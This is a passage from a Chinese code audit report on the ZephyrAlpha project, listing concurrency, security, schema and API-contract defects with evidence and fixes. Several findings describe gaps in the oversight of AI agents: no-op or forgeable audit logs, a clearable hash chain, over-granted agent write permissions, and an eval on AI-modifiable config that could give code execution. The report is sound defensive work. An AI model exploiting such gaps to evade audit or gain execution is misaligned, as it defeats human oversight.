- 证据：[metrics_bridge.py:162-171](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/metrics_bridge.py) `if cls._instance is None: cls._instance=cls()` 无锁；对比 `budget_engine.py:112-119` 用了正确DCL。并发emit_metrics可创建多实例，各自建表+持不同DB连接，指标分叉
- 病根：根因2（单例模式无统一基类/装饰器）
- 修复：抽取`@threadsafe_singleton`装饰器强制统一

#### 5.16.3 fault_types.get_default_registry无锁单例+多次注册【HIGH】
- 证据：[fault_types.py:157-170](file:///d:/ZephyrAlpha/src/zephyr/trading/orchestrator/fault_types.py) `_DEFAULT_REGISTRY=None; if is None: create+register 5个` 无锁check-then-act，并发可各自创建registry并register，返回不同实例
- 病根：根因2（单例模式无统一规范）
- 修复：`functools.lru_cache(maxsize=1)` 或加模块级Lock

#### 5.16.4 PipelineOrchestrator._lsg_gateway懒加载竞态（3处+6处复制）【HIGH】
- 证据：[pipeline_orchestrator.py:1745-1747,1779-1781,1837-1839](file:///d:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py) `if _lsg_gateway is None: _lsg_gateway=LSGSecurityGateway()` 类属性无锁；同模式在 `integration/llm_gateway.py:46`、`mcp/gateway_server.py:73`、`infrastructure/pipeline/llm_gateway.py:46` 等6+处重复
- 病根：根因5（高频懒加载模式无并发规范）
- 修复：抽取LazyGatewayHolder基类强制加锁

#### 5.16.5 GitCommitGateway _GlobalCommitLock TOCTOU僵尸锁清理竞态【HIGH】
- 证据：[git_commit_gateway.py:268-287](file:///d:/ZephyrAlpha/src/zephyr/governance/git_commit_gateway.py) `if not is_pid_alive(holder_pid): os.remove(lock_file)` check与act非原子；两Trae进程同时发现PID死亡：A remove→A create→B remove(A的)→B create，两进程同时持"全局串行锁"；同问题在 [staging_area.py:_CrossProcessLock](file:///d:/ZephyrAlpha/src/zephyr/trading/staging_area.py) 第90-161行
- 病根：根因5（TOCTOU窗口未识别）
- 修复：用`os.open(O_CREAT|O_EXCL)`单次原子创建或`msvcrt.locking`/`fcntl.flock`内核级锁

#### 5.16.6 GitCommitGateway stash→commit→pop跨子进程非原子+stash堆积【HIGH】
- 证据：[git_commit_gateway.py:1977-2117](file:///d:/ZephyrAlpha/src/zephyr/governance/git_commit_gateway.py) `_stash_other_files→git add→git commit→_restore_stash` 跨4+次subprocess；commit后pop前崩溃→stash永久残留；文件注释（2047-2057行）承认"7+个stash无法pop"实测事故
- 病根：根因5（INVARIANTS写"commit原子"但跨子进程非原子）
- 修复：改用`git commit -- <pathspec>`精确提交或worktree隔离

#### 5.16.7 DeferredQueue sqlite3共享连接+check_same_thread=False【HIGH】
- 证据：[deferred_queue.py:74-85](file:///d:/ZephyrAlpha/src/zephyr/trading/orchestrator/deferred_queue.py) `sqlite3.connect(db_path, check_same_thread=False)` 关闭线程检查，依赖`self._lock`但`_get_conn`的check-then-act要求所有调用方持锁，新增方法忘记`with self._lock:`即损坏；同模式在 `resilience/deferred_queue.py` 复制
- 病根：根因2（`_get_conn`应强制锁但无门禁阻止绕过）
- 修复：改`threading.local()`每线程独立连接或`_get_conn`内`assert self._lock._is_owned()`

#### 5.16.8 AsyncRuntime run_in_executor executor创建竞态【HIGH】
- 证据：[async_runtime.py:194-206,228-232](file:///d:/ZephyrAlpha/src/zephyr/trading/runtime/async_runtime.py) `if self._executor is None: self._executor=ThreadPoolExecutor(...)` 无锁；模块INVARIANTS（第8行）"不持有threading.Lock避免asyncio死锁"导致executor创建无法加锁——设计自相矛盾
- 病根：根因5（INVARIANTS规则本身有缺陷）
- 修复：用`asyncio.Lock`保护或`start()`时一次性创建executor

#### 5.16.9 跨6+文件重复的asyncio.run+get_event_loop反模式【HIGH】
- 证据：`context_injector.py:261`、`gateway_server.py:95-110`、`integration/llm_gateway.py:69-77`、`autonomy_core/llm_gateway.py:69-77`、`default_security_gateway.py:273-281`、`delegation_engine.py:246`、`brain_integration.py:211-228`（new_event_loop不close）均 `asyncio.get_event_loop()`（3.12+弃用）+ `run_until_complete` fallback `asyncio.run`（已有循环时再抛RuntimeError）
- 病根：根因2+5（async/sync桥接无共享封装，错误处理靠复制）
- 修复：抽取`run_async_safely(coro)`到async_runtime.py统一

#### 5.16.10 BackpressureManager get_state/get_all_paused返回可变对象别名【MEDIUM】
- 证据：[backpressure_manager.py:187-193](file:///d:/ZephyrAlpha/src/zephyr/integration/backpressure_manager.py) `with self._lock: return self._get_or_create(symbol)` 返回dict内对象引用，调用方可外部无锁修改`paused_until`/`max_rate_per_sec`，破坏内部不变量
- 病根：根因5（RLock保护字典结构但未保护字典内对象字段）
- 修复：返回`copy.deepcopy(state)`或冻结为`dataclass(frozen=True)`

#### 5.16.11 WorkOrchestrator register_dag/load_dags无锁【MEDIUM】
- 证据：[work_orchestrator.py:57-80](file:///d:/ZephyrAlpha/src/zephyr/trading/work_orchestrator.py) 类声明`self._lock`且`submit/schedule_next`正确持锁，但`register_dag/load_dags/get_dag/list_dags`完全绕过锁；`load_dags`后台扫描时若线程`get_dag`，dict迭代中修改抛RuntimeError
- 病根：根因2（锁保护"部分强制"）
- 修复：AST门禁——类含`self._lock`则所有访问`self._<mutable>`必须`with self._lock`

#### 5.16.12 LocalModelScheduler队列无边界+wait_result轮询+start竞态【MEDIUM】
- 证据：[local_model_scheduler.py:121,141-164,166-171](file:///d:/ZephyrAlpha/src/zephyr/integration/local_model/local_model_scheduler.py) `queue.Queue()` 无maxsize；`wait_result` 用`time.sleep(0.5)`轮询而非Condition；`start()` `if self._running:return;self._running=True` 无锁可创建多worker线程
- 病根：根因5（生产者-消费者模式无规范）
- 修复：`Queue(maxsize=N)` + `Condition.notify_all()` + `start()`加锁

#### 5.16.13 rate_limiter acquire锁外sleep+_waited锁外自增【MEDIUM】
- 证据：[rate_limiter.py:107-122](file:///d:/ZephyrAlpha/src/zephyr/integration/mcp/rate_limiter.py) `self._waited+=1`（第122行）在锁外，并发等待线程lost update；`wait_time`基于释放锁前的`_tokens`，期间其他线程获取token则本线程sleep过长
- 病根：根因5（Token Bucket实现细节错误，无并发测试）
- 修复：`_waited+=1`移入锁内

#### 5.16.14 capability_registry register持久化在锁外+非原子write【MEDIUM】
- 证据：[capability_registry.py:48-54,99-105](file:///d:/ZephyrAlpha/src/zephyr/trading/capability_registry.py) `with self._lock: _cards[id]=card` 加锁OK，但 `if _card_dir: self._persist_card(card)` 锁外持久化；`path.write_text(yaml.dump(...))` 非原子写，跨进程B的`load_from_dir`可读到半写YAML，`except:continue`吞异常静默丢卡
- 病根：根因5（跨进程持久化无原子写规范，staging_area._atomic_replace已有正确实现但未复用）
- 修复：`tempfile+os.replace`原子写，持久化移入锁内或用文件锁

#### 5.16.15 resource_guard apply_degradation读_on_critical无锁【MEDIUM】
- 证据：[resource_guard.py:114,203-208,290-315](file:///d:/ZephyrAlpha/src/zephyr/behavioral_audit/resource_guard.py) LEVEL_4(OOM临界)路径读`_on_critical`全局变量无锁；若另一线程`set_on_critical`替换回调，本线程可能调用旧回调或部分更新对象；`_current_pool_size`锁内写但多处锁外读
- 病根：根因5（模块级全局可变状态无统一访问规范）
- 修复：所有`_on_critical`/`_current_pool_size`读写统一经`_guard_lock`

#### 5.16.16 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 9（5.16.1~5.16.9） |
| MEDIUM | 6（5.16.10~5.16.15） |
| LOW | 0 |
| **合计** | **15** |

---

### 5.17 安全纵深防御与访问控制（15个，第8轮新增）

> 审计维度：审计日志完整性/密钥管理/输入验证/权限边界/依赖安全/代码执行风险/网络边界/文件权限
> 审计方法：Grep + Read真实文件取证（audit_trail/writer.py、ai_audit_logger.py、tamper_evident_log.py、rbac_roles.yaml等）

#### 5.17.1 AuditWriter.write()是no-op桩——hash链永不落盘【HIGH】
- 证据：[audit_trail/writer.py:98-106](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/writer.py) `class AuditWriter: def write(self,entry): pass; def flush(self): pass`；被10+生产路径实例化：`pipeline_orchestrator.py:229`、`engine.py:106`、`governance_server.py:714`、`audit_write_failure_protector.py:40`、`session_audit.py:330`、`tamper_evident_log.py:103`、`finding_ingest.py:60`；`AuditChainVerifier`（有真实hash链）的`_core_writer.write(core_event)`也落到此no-op
- 病根：根因5（安全机制名实分离，名为AuditWriter实为空壳）
- 修复：实现write()真正落盘append-only JSONL+hash链，或标NotImplementedError防误用

#### 5.17.2 HMAC密钥硬编码"default-key"无视env配置【HIGH】
- 证据：[audit_trail/writer.py:119-120](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/writer.py) `def _resolve_hmac_key(config=None): return b"default-key"`；`.env.example:42-44` 文档 `ZEPHYR_AUDIT_HMAC_SECRET=` 注明"生产必须设置"，代码根本不读env
- 病根：根因5（密钥管理SSoT未落地）
- 修复：读取`ZEPHYR_AUDIT_HMAC_SECRET`，缺失时抛错非回退默认

#### 5.17.3 AiAuditLogger谎称"不可变"但无任何篡改检测【HIGH】
- 证据：[ai_audit_logger.py:18-23](file:///d:/ZephyrAlpha/src/zephyr/trading/ai_audit_logger.py) 文档声明"不可变、追加式"；`:63-68` `_write` 仅 `open("a")` 写明文JSON，无hash/签名/prev_hash链；`:199-218` `query()` 直接`json.loads`读取零完整性校验
- 病根：根因5（安全机制名实分离）
- 修复：写入附hash链（prev_hash+HMAC），query强制verify

#### 5.17.4 AuditChainVerifier hash链仅存内存且可clear()抹除【HIGH】
- 证据：[audit_chain_verifier.py:68](file:///d:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py) `self._chain:list=[]` 进程内列表重启即失；`:165-167` `def clear(self): self._chain.clear(); self._last_hash="0"*64` 无审计无留痕清空；结合5.17.1（core_writer no-op）链既不落盘又可随意清除
- 病根：根因5（纵深防御单点化）
- 修复：链状态持久化append-only存储，禁止clear()或需二次授权留痕

#### 5.17.5 TamperEvidentLog hash链无HMAC/trusted anchor可整体重写【MEDIUM】
- 证据：[tamper_evident_log.py:67-98](file:///d:/ZephyrAlpha/src/zephyr/governance/tamper_evident_log.py) `hashlib.sha256(f"{counter}:{action}:{data}:{now}:{prev_hash}")` 纯明文无密钥；`:84` `open(self._log_path,"a")` 创建文件未设权限（默认0o644世界可读可写）；攻击者获文件写权限可从首条重算整链，`verify()`无法察觉
- 病根：根因5（tamper-evident实为tamper-forgable）
- 修复：改HMAC-SHA256，定期tail_hash外部锚定（git/远程签名）

#### 5.17.6 StageContext.evaluate_skip用eval执行配置字符串【HIGH】
- 证据：[integration/models.py:598-603](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `def evaluate_skip(self,condition): namespace={"ctx":self,"all":all,"any":any}; return bool(eval(condition,{"__builtins__":{}},namespace))`；`{"__builtins__":{}}`限制可经`ctx.__class__.__mro__`逃逸；condition来自`PipelineStage.skip_condition`配置，`ai_autonomy=ai_modifiable`普遍标注——AI改配置即RCE
- 病根：根因5（用eval表达配置条件）
- 修复：改受限表达式求值器（ast.literal_eval+白名单或simpleeval库）

#### 5.17.7 task_repo.py生产路径shell=True违反D-A-03红线【HIGH】
- 证据：[task_repo.py:1811-1817](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)`；cmd来自task定义`commands:list[str]`；`validate_script_quality.py:378` 明令"禁止shell=True"且`detect_shell_true.py`专门扫描，但src/生产代码仍含此违规
- 病根：根因5（门禁覆盖盲区，扫描器未覆盖src/或CI未阻断）
- 修复：改`subprocess.run(shlex.split(cmd))`，扫描器扩展到src/

#### 5.17.8 RBAC默认关闭（_AUTO_ENABLE_RBAC默认False）【HIGH】
- 证据：[_base_server.py:183-188](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/_base_server.py) `if not getattr(self,"_AUTO_ENABLE_RBAC",False): ...skip RBAC`；MCP server默认不启用RBAC须子类显式设True；`config/rbac_roles.yaml`定义权限但执行是opt-in非default-deny
- 病根：根因5（默认开放而非默认拒绝）
- 修复：翻转默认True（default-deny），未声明权限的server拒绝所有写

#### 5.17.9 agent_writer（L0_INTERN、owner_approved:false）被授予write:src【MEDIUM】
- 证据：[rbac_roles.yaml:39-50](file:///d:/ZephyrAlpha/config/rbac_roles.yaml) `agent_writer: maturity:L0_INTERN; owner_approved:false; permissions:[write:src,write:tests,execute:scripts]; auto_generated:true` 实习级未过审批可写源码，权限越授
- 病根：根因5（默认开放+权限自动生成无人工复核）
- 修复：write:src仅授owner_approved=true且maturity≥L2，auto_generated需人工sign-off

#### 5.17.10 多处裸os.getenv读API key绕过SecretProvider【MEDIUM】
- 证据：[secrets.py:38](file:///d:/ZephyrAlpha/src/zephyr/shared/security/secrets.py) 明令"MUST通过SecretProvider读取禁止裸os.getenv"；但 `deepseek_chat.py:123`、`deseek_v4_chat.py:178`、`integration/llm_gateway.py:144-145`、`autonomy_core/llm_gateway.py:144-145`、`infrastructure/pipeline/llm_gateway.py:152-153` 等6+处直接`os.getenv("DEEPSEEK_API_KEY","")`
- 病根：根因5（密钥管理SSoT未落地，有规范无执行）
- 修复：所有LLM gateway改用`await SecretProvider.get_secret(...)`

#### 5.17.11 依赖无上界钉版+无hash校验+requirements与pyproject分裂【MEDIUM】
- 证据：[requirements.txt:1-9](file:///d:/ZephyrAlpha/requirements.txt) 全`>=`无上界无hash；[pyproject.toml:13-26](file:///d:/ZephyrAlpha/pyproject.toml) 同全`>=`且比requirements多3依赖（duckdb/structlog/pyarrow），SSoT分裂；无`pip --require-hashes`无SBOM锁文件
- 病根：根因5（依赖治理缺位）
- 修复：引入pip-tools生成requirements.lock（含hash），上界钉主版本

#### 5.17.12 敏感/审计文件无权限收紧（0o644世界可读）【MEDIUM】
- 证据：`rollback_lock.py:127,171` 锁文件0o644；`atomic_transaction_manager.py:243` `os.open(tmp,_flags|_binary,0o644)`；`tamper_evident_log.py:84` open默认权限；全项目grep无`0o600`/`0o700`/`os.chmod`收紧密钥或审计文件
- 病根：根因5（纵深防御单点化，仅靠fs层默认权限）
- 修复：审计/密钥/锁文件创建时`os.chmod(path,0o600)`，`.runtime/`目录0o700

#### 5.17.13 pyproject.toml项目级禁用F821掩盖安全静默失败【LOW】
- 证据：[pyproject.toml:138](file:///d:/ZephyrAlpha/pyproject.toml) `"F821",  # undefined name (TraceContext等系统性问题，需批量修复，后续建卡处理)`；注释自承认存在未定义符号但项目级关闭检查；若安全函数（sanitize_secret/verify_chain）拼错或未导入，运行时静默NameError
- 病根：根因5（门禁覆盖盲区，lint主动放行已知问题）
- 修复：修复TraceContext等未定义符号后移除F821 ignore，至少`src/zephyr/security/**`和`governance/**`子目录re-enable

#### 5.17.14 secret_rotation模块存在但未接入SecretProvider【LOW】
- 证据：[secret_rotation.py:37-47](file:///d:/ZephyrAlpha/src/zephyr/ops/security/secret_rotation.py) 定义`SecretRotationRecord(rotation_interval_days=90,needs_rotation)`；但[secrets.py](file:///d:/ZephyrAlpha/src/zephyr/shared/security/secrets.py)的`EnvSecretProvider`/`DotEnvSecretProvider`无任何轮换集成——get_secret不检查last_rotated不触发轮换不告警过期；`secret_rotation.py:15`标`stability=evolving, safety=L`孤立模块
- 病根：根因5（安全机制名实分离，有轮换模块不轮换）
- 修复：SecretProvider.get_secret前置needs_rotation检查

#### 5.17.15 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 6（5.17.1~5.17.4+5.17.6+5.17.7+5.17.8） |
| MEDIUM | 7（5.17.5+5.17.9~5.17.12） |
| LOW | 2（5.17.13+5.17.14） |
| **合计** | **15** |

---

### 5.18 数据完整性与Schema演进（15个，第8轮新增）

> 审计维度：外键约束/级联规则/约束验证/迁移安全/数据类型一致性/NULL语义/时间戳一致性/唯一性保证/引用完整性/Schema版本管理
> 审计方法：Grep + Read真实文件取证（sqlite_schema.py、depgraph_schema.py、00_sqlite_actual_schema.sql、02_create_pg_schema.sql等8个核心真源）

#### 5.18.1 PRAGMA foreign_keys在事务内执行无效（no-op）【HIGH】
- 证据：[sqlite_schema.py:1070](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `conn.execute("BEGIN")` 在事务里执行全部迁移；v15(L641)/v19(L754)/v26(L847)/v27(L893)含`"PRAGMA foreign_keys=OFF"...PRAGMA foreign_keys=ON"`；SQLite硬限制：PRAGMA foreign_keys在事务内是no-op（[SQLite文档](https://sqlite.org/pragma.html#pragma_foreign_keys)）
- 病根：根因5（规则丰富但执行断层）
- 修复：在init_db的BEGIN之前执行PRAGMA或改连接级开关

#### 5.18.2 rule_bindings.rule_id类型不匹配的外键（TEXT→INTEGER）【HIGH】
- 证据：[00_sqlite_actual_schema.sql:337](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) `FOREIGN KEY (rule_id) REFERENCES nodes(node_id)`，rule_id是`TEXT NOT NULL`(L333)，nodes.node_id是`INTEGER PRIMARY KEY AUTOINCREMENT`(L279)；类型不匹配FK在SQLite宽松模式下不报错但永不生效
- 病根：根因1（迁移不完整，DDL抄错引用目标）
- 修复：删除该FK或新建rules表作为rule_id真源

#### 5.18.3 PG迁移悄悄丢失rule_bindings外键约束【HIGH】
- 证据：[02_create_pg_schema.sql:358-366](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/02_create_pg_schema.sql) rule_bindings表定义完全无`REFERENCES`子句，而SQLite原版(00:337)有FK；迁移翻译时静默丢弃FK，PG中rule_bindings可任意引用不存在的rule_id
- 病根：根因1（SQLite→PG迁移翻译不完整）
- 修复：在PG schema补FK或显式声明"应用层校验"

#### 5.18.4 gate_decisions表存在3个互斥的schema定义（schema分裂）【HIGH】
- 证据：[sqlite_schema.py:919](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v28 migration `gate_decisions(decision_id INTEGER PK, gate_id TEXT, decision TEXT, reason TEXT, decided_at TEXT, decided_by TEXT)` 无FK；[gate_persistence.py:142](file:///d:/ZephyrAlpha/src/zephyr/behavioral_audit/gate_persistence.py) `gate_decisions(id INTEGER PK, module_id TEXT, gate TEXT, decision TEXT, detail TEXT, decided_at TEXT)` 列名完全不同；`red_blue_report.json:31` 报告历史v3曾有gate_decisions→gates的FK
- 病根：根因2（同名表多定义，两模块各建各的）
- 修复：统一gate_decisions为单一DDL真源，删除散点建表

#### 5.18.5 tasks.domain_id跨数据库外键（SQLite无法实现）【HIGH】
- 证据：[test_db_integration.py:5](file:///d:/ZephyrAlpha/tests/test_db_integration.py) 注释"governance.db的tasks.domain_id→depgraph的domains.domain_id外键一致性"；[sqlite_schema.py:915](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v28 migration `UPDATE tasks SET domain_id=NULL WHERE domain_id NOT IN (SELECT domain_id FROM domains)` 清洗485行违规；但governance.db的tasks表DDL从未定义domain_id列也无FK——跨库FK SQLite物理上无法实现
- 病根：根因1（9库→3库合并未完成，跨库引用遗留）
- 修复：tasks.domain_id列删除，或domains表迁入governance.db，或改PG跨schema FK

#### 5.18.6 task_events v2重建丢失UNIQUE约束和CHECK约束【HIGH】
- 证据：[sqlite_schema.py:721-735](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v18 `event_type TEXT NOT NULL CHECK(event_type IN (...14种...))` + `UNIQUE(event_type,task_id,created_at)`；[sqlite_schema.py:257-266](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v19 `_DDL_TASK_EVENTS_V2` `event_type TEXT NOT NULL`（无CHECK）+ 无任何UNIQUE；v19重建后14种事件类型枚举约束和唯一性约束全部消失
- 病根：根因1（迁移重建时只搬数据不搬约束）
- 修复：在v19后补migration加CHECK约束+部分唯一索引

#### 5.18.7 PRAGMA writable_schema直接改sqlite_master（极危险hack）【HIGH】
- 证据：[sqlite_schema.py:813-815](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py)（v23）、`:834-839`（v25）、`:895-906`（v27）三处用`PRAGMA writable_schema=ON` + `UPDATE sqlite_master SET sql=replace(...)`直接修改表定义字符串；SQLite官方明确警告可导致数据库损坏且不更新内部schema缓存；v25的LIKE模式`'...OPS''))%'`极脆弱
- 病根：根因5（用hack绕过SQLite不支持ALTER CONSTRAINT的限制）
- 修复：改用"建新表→复制数据→DROP旧表→RENAME"重建模式

#### 5.18.8 edges表FK无ON DELETE CASCADE靠trigger补救但trigger在replica模式失效【HIGH】
- 证据：[00_sqlite_actual_schema.sql:210-211](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) `FOREIGN KEY (from_node_id) REFERENCES "nodes"(node_id)` 无CASCADE；`:724-729` 用`trg_nodes_delete_cleanup_edges` trigger补救；但[depgraph_schema.py:1199-1201](file:///d:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py) `get_depgraph_pg_connection(replica=True)` 会`SET session_replication_role='replica'`禁用所有trigger——此时删nodes留孤儿edges；`dependency_architecture_panorama.md:2041`已承认148条孤儿边
- 病根：根因1（用trigger模拟CASCADE是反模式，replica模式下失效）
- 修复：PG中改`REFERENCES nodes(node_id) ON DELETE CASCADE`，删除trigger

#### 5.18.9 nodes/arch_directory_tree/domain_mapping的domain_id无FK到domains【MEDIUM】
- 证据：[00_sqlite_actual_schema.sql:278-309](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) nodes表domain_id TEXT无FK；`:57-68` arch_directory_tree.domain_id TEXT无FK；`:161-170` domain_mapping.domain_id TEXT无FK；对比`:71-80` arch_path_mappings有FK(L79)；[02_create_pg_schema.sql:285](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/02_create_pg_schema.sql) arch_path_mappings在PG有FK但nodes(L224-262)仍无FK到domains
- 病根：根因1（FK定义遗漏，是949孤儿的DDL层根因之一）
- 修复：为nodes.domain_id、arch_directory_tree.domain_id、domain_mapping.domain_id补FK

#### 5.18.10 task_reviews外键无ON DELETE CASCADE（与task_files不一致）【MEDIUM】
- 证据：[sqlite_schema.py:342](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `FOREIGN KEY (task_id) REFERENCES tasks(task_id)` 无级联；对比[sqlite_schema.py:202](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) task_files `task_id TEXT NOT NULL REFERENCES tasks(task_id) ON DELETE CASCADE`；删除task后task_files自动清理但task_reviews留孤儿；v29(L933)才补建task_reviews仍未加CASCADE
- 病根：根因5（约束应用不一致，同级FK级联规则不统一）
- 修复：统一所有引用tasks(task_id)的FK加`ON DELETE CASCADE`

#### 5.18.11 fle_dispatch_log外键无ON DELETE CASCADE【MEDIUM】
- 证据：[sqlite_schema.py:317](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `event_id TEXT NOT NULL REFERENCES fle_alerts(event_id)` 无级联；删除fle_alerts记录时被FK阻断（RESTRICT默认）或留孤儿（若PRAGMA foreign_keys=OFF）
- 病根：根因5（FK级联规则未规范化）
- 修复：加`ON DELETE CASCADE`，dispatch_log是alert从属记录

#### 5.18.12 depgraph无Python迁移框架（init_db只验证不迁移）【MEDIUM】
- 证据：[depgraph_schema.py:1124-1162](file:///d:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py) `init_db()` 只`SELECT table_name FROM information_schema.tables` 验证存在不执行DDL；`:1085-1121` `_run_migration` 注释"P2迁移后：保留作为参考，init_db中不再调用"；`_MIGRATIONS`列表(L639-1053)有18条历史迁移全部不执行；PG schema变更靠手动跑`02_create_pg_schema.sql`无版本化迁移
- 病根：根因1（P2迁移后迁移框架被废弃）
- 修复：引入alembic或恢复`_MIGRATIONS`执行，配合`_schema_version`表

#### 5.18.13 所有迁移forward-only无downgrade/rollback脚本【MEDIUM】
- 证据：全项目Grep `def downgrade|def rollback_migration|downgrade_migration|backward.*migration|revert_migration` 仅命中3处均与DB schema无关；[sqlite_schema.py](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `_MIGRATIONS`列表29条全部只有forward DDL无对应downgrade；v19(L755)用`_task_events_v18_backup`临时表是手动backup非系统化rollback
- 病根：根因5（迁移框架设计不完整，生产事故无法快速回滚）
- 修复：为每个migration补downgrade脚本或引入alembic up/down双向迁移

#### 5.18.14 gates表在两个DB中结构完全不同（同名异构）【MEDIUM】
- 证据：depgraph [00_sqlite_actual_schema.sql:225-236](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) `gates(gate_id TEXT PK, name, entry, description, files_trigger, always_run, category, status, source, event_driven, auto_start)` 11列只读表（YAML真源）；governance.db [sqlite_schema.py:163-174](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `gates(gate_run_id TEXT PK, gate_id TEXT, passed INTEGER, details, artifact_path, session_id, task_id, created_at)` 7列运行记录；两表同名但列名/语义/PK完全不同，跨库JOIN出错
- 病根：根因2（同名表多定义）
- 修复：governance.db的gates改名`gate_runs`

#### 5.18.15 schema层时间戳DEFAULT不一致（三套格式混用）【LOW】
- 证据：[sqlite_schema.py:190-191](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) circuit_breaker_state `created_at TEXT NOT NULL DEFAULT (datetime('now'))` SQLite内置UTC无时区；`:112-113` tasks `created_at TEXT NOT NULL` 无DEFAULT应用层填；`:978` migration记录 `datetime.now(UTC).isoformat()` Python UTC带时区；[apply_depgraph.py:1416](file:///d:/ZephyrAlpha/scripts/governance/apply_depgraph.py) domains `datetime.datetime.now().isoformat()` 本地时间无时区（naive）；三种格式混用导致ORDER BY排序错乱、`>`比较失效
- 病根：根因5（时间戳真源未规范化，5.12.3已记录now_iso()函数漂移但未覆盖schema DEFAULT层）
- 修复：全DB统一`DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))`，应用层禁止传naive datetime

#### 5.18.16 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 8（5.18.1~5.18.8） |
| MEDIUM | 6（5.18.9~5.18.14） |
| LOW | 1（5.18.15） |
| **合计** | **15** |

---

### 5.19 API契约与接口一致性（12个，第9轮新增）

> 审计维度：Pydantic schema漂移/函数签名契约/返回类型LSP/可变默认值/ABC未实现/Protocol误用/__init__导出
> 审计方法：Grep + Read真实文件取证（integration/models.py、shared/contracts/protocols.py、auto_fix_engine/models.py等）

#### 5.19.1 Pydantic v1 class Config与v2 model_config在同一文件混用【HIGH】
- 证据：[integration/models.py:504](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `class Config: use_enum_values=True`（v1语法），同文件L114/143/155/215用 `model_config=BASE_CONFIG`（v2语法）；[infrastructure/pipeline/models.py:505](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/models.py) 同混用；[agent_identity.py:144](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) 同
- 病根：根因1（v1→v2迁移未完成，pydantic_v2_migrator.py未扫描class Config模式）
- 修复：替换为 `model_config=ConfigDict(use_enum_values=True)`，migrator增加class Config检测

#### 5.19.2 __all__=["*"]非功能性模式（13个__init__.py）【HIGH】
- 证据：[pf_core/strategy_engine/__init__.py:7](file:///d:/ZephyrAlpha/src/zephyr/pf_core/strategy_engine/__init__.py) `__all__=["*"]` + `from zephyr.governance.strategy_engine import *`；共13个文件（pf_core/strategy_engine、ops/schema、ops/profiles、ops/health、ops/alerts、compliance/behavioral_admission等）；`__all__=["*"]` 字面意思是"导出名为*的属性"，执行 `from module import *` 会 `getattr(module,"*")` 引发AttributeError
- 病根：根因5（代码语义错误，re-export wrapper契约完全失效）
- 修复：删除 `__all__=["*"]`（不声明时import *自动导出非_开头名称）或显式列出符号

#### 5.19.3 BaseFixer(BaseModel)用Pydantic数据模型充当抽象基类【HIGH】
- 证据：[auto_fix_engine/models.py:192-211](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/models.py) `class BaseFixer(BaseModel): def scan(self): raise NotImplementedError; def fix(self,...): raise NotImplementedError` 4个方法；[security/access_control/auto_fix_engine_03/models.py:192-211](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/models.py) 完全相同duplicate；BaseFixer非ABC可被直接实例化，子类无需实现即可通过类型检查
- 病根：根因5（抽象基类未实现，Pydantic BaseModel不应承载抽象行为契约）
- 修复：改为 `class BaseFixer(abc.ABC)` + `@abc.abstractmethod`

#### 5.19.4 verify_chain()返回类型LSP违约——6个实现6种返回类型【HIGH】
- 证据：[protocols.py:104](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `-> dict`；[integrity.py:107](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/integrity.py) `-> dict[str,Any]`；[forensic_package.py:45](file:///d:/ZephyrAlpha/src/zephyr/governance/forensic_package.py) `-> bool`；[audit_chain_verifier.py:115](file:///d:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py) `-> AuditReport`；[risk_mitigation.py:220](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py) `-> tuple[bool,list[str]]`；[crypto_bootstrap.py:72](file:///d:/ZephyrAlpha/src/zephyr/ops/forensic/crypto_bootstrap.py) `-> bool`
- 病根：根因1（接口契约未SSoT化，Liskov替换原则彻底失效）
- 修复：定义统一 `ChainVerificationResult` 类型，所有实现返回此类型

#### 5.19.5 sign_token()签名与返回类型契约漂移【HIGH】
